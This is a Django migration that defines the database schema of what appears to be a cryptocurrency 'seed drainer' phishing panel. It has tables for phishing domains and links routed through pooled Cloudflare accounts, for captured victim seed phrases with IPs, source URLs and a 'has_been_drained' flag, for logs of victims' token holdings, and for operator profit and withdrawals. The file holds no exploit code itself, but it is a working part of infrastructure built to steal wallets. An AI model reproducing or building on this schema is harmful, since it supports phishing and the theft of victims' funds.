# Generated by Django 4.0.6 on 2022-11-15 17:57

from django.conf import settings
from django.db import migrations, models
import django.db.models.deletion
import django.utils.timezone
import main.models


class Migration(migrations.Migration):

    initial = True

    dependencies = [
        ('auth', '0012_alter_user_first_name_max_length'),
    ]

    operations = [
        migrations.CreateModel(
            name='User',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('last_login', models.DateTimeField(blank=True, null=True, verbose_name='last login')),
                ('username', models.CharField(max_length=50, unique=True, verbose_name='username')),
                ('password', models.CharField(max_length=100, verbose_name='password')),
                ('role', models.CharField(default='user', max_length=50, verbose_name='role')),
                ('created_at', models.DateTimeField(default=django.utils.timezone.now, verbose_name='created_at')),
                ('is_staff', models.BooleanField(default=False, verbose_name='is_staff')),
                ('is_superuser', models.BooleanField(default=False, verbose_name='is_superuser')),
                ('is_active', models.BooleanField(default=True, verbose_name='is_active')),
                ('groups', models.ManyToManyField(blank=True, help_text='The groups this user belongs to. A user will get all permissions granted to each of their groups.', related_name='user_set', related_query_name='user', to='auth.group', verbose_name='groups')),
                ('user_permissions', models.ManyToManyField(blank=True, help_text='Specific permissions for this user.', related_name='user_set', related_query_name='user', to='auth.permission', verbose_name='user permissions')),
            ],
            options={
                'abstract': False,
            },
            managers=[
                ('objects', main.models.UserManager()),
            ],
        ),
        migrations.CreateModel(
            name='Cloudflare',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('email', models.CharField(max_length=100, verbose_name='email')),
                ('token', models.CharField(max_length=200, verbose_name='token')),
                ('used', models.IntegerField(default=0, verbose_name='used')),
                ('cloud_id', models.CharField(max_length=200, verbose_name='cloud_id')),
                ('created_at', models.DateTimeField(default=django.utils.timezone.now, verbose_name='created_at')),
            ],
        ),
        migrations.CreateModel(
            name='Design',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('name', models.TextField()),
                ('img', models.ImageField(upload_to='static/img/designs')),
                ('type', models.TextField(choices=[('Smart contract', 'Smart contract'), ('Seed drainer', 'Seed drainer')])),
                ('created_at', models.DateTimeField(default=django.utils.timezone.now, verbose_name='created_at')),
            ],
        ),
        migrations.CreateModel(
            name='Domain',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('name', models.TextField()),
                ('ns1', models.TextField()),
                ('ns2', models.TextField()),
                ('cloudId', models.TextField(blank=True, null=True)),
                ('status', models.TextField(default='Waiting for connection')),
                ('created_at', models.DateTimeField(default=django.utils.timezone.now, verbose_name='created_at')),
                ('cloud', models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.DO_NOTHING, to='main.cloudflare')),
                ('user', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to=settings.AUTH_USER_MODEL)),
            ],
        ),
        migrations.CreateModel(
            name='Link',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('path', models.TextField(default='/')),
                ('design', models.TextField(default='Set design')),
                ('created_at', models.DateTimeField(default=django.utils.timezone.now, verbose_name='created_at')),
                ('domain', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to='main.domain')),
                ('user', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to=settings.AUTH_USER_MODEL)),
            ],
        ),
        migrations.CreateModel(
            name='nft_transactions',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('transaction_id', models.TextField()),
                ('token_address', models.TextField()),
                ('token_id', models.TextField()),
                ('from_wallet', models.TextField()),
                ('is_confirmed', models.IntegerField()),
                ('is_sent', models.IntegerField()),
                ('remaining_token_amout_to_send', models.IntegerField()),
                ('nft_type', models.TextField()),
            ],
            options={
                'verbose_name': 'nft_transactions',
                'verbose_name_plural': 'nft_transactions',
            },
        ),
        migrations.CreateModel(
            name='transactions',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('transaction_id', models.TextField()),
                ('token_address', models.TextField()),
                ('from_wallet', models.TextField()),
                ('amount_to_send', models.TextField()),
                ('is_confirmed', models.IntegerField()),
                ('is_sent', models.IntegerField()),
            ],
            options={
                'verbose_name': 'transactions',
                'verbose_name_plural': 'transactions',
            },
        ),
        migrations.CreateModel(
            name='Withdraw',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('status', models.TextField(choices=[('Sended', 'Sended'), ('In review', 'In review'), ('Completed', 'Completed')], default='Sended')),
                ('sum', models.IntegerField()),
                ('coin', models.TextField()),
                ('created_at', models.DateTimeField(default=django.utils.timezone.now, verbose_name='created_at')),
                ('user', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to=settings.AUTH_USER_MODEL)),
            ],
        ),
        migrations.CreateModel(
            name='Wallet',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('btc', models.TextField()),
                ('eth', models.TextField()),
                ('xmr', models.TextField()),
                ('btcBalance', models.IntegerField(default=0)),
                ('ethBalance', models.IntegerField(default=0)),
                ('xmrBalance', models.IntegerField(default=0)),
                ('user', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to=settings.AUTH_USER_MODEL)),
            ],
        ),
        migrations.CreateModel(
            name='seed',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('ip', models.TextField()),
                ('url_from', models.TextField()),
                ('seed', models.TextField()),
                ('erc20_token', models.TextField()),
                ('eth_sum', models.TextField()),
                ('token', models.TextField()),
                ('screen_chatid', models.TextField()),
                ('action_chatid', models.TextField()),
                ('owner_wallet', models.TextField()),
                ('has_been_drained', models.IntegerField()),
                ('created_at', models.DateTimeField(default=django.utils.timezone.now, verbose_name='created_at')),
                ('link', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to='main.link')),
                ('user', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to=settings.AUTH_USER_MODEL)),
            ],
            options={
                'verbose_name': 'seed',
                'verbose_name_plural': 'seed',
            },
        ),
        migrations.CreateModel(
            name='Profit',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('sum', models.IntegerField()),
                ('coin', models.TextField()),
                ('created_at', models.DateTimeField(default=django.utils.timezone.now, verbose_name='created_at')),
                ('user', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to=settings.AUTH_USER_MODEL)),
            ],
        ),
        migrations.CreateModel(
            name='Log',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('ip', models.TextField()),
                ('status', models.TextField()),
                ('address', models.TextField(blank=True, null=True)),
                ('erc20', models.TextField(blank=True, null=True)),
                ('erc1155', models.TextField(blank=True, null=True)),
                ('erc721', models.TextField(blank=True, null=True)),
                ('sumEth', models.TextField(blank=True, null=True)),
                ('created_at', models.DateTimeField(default=django.utils.timezone.now, verbose_name='created_at')),
                ('link', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to='main.link')),
                ('user', models.ForeignKey(on_delete=django.db.models.deletion.DO_NOTHING, to=settings.AUTH_USER_MODEL)),
            ],
        ),
    ]
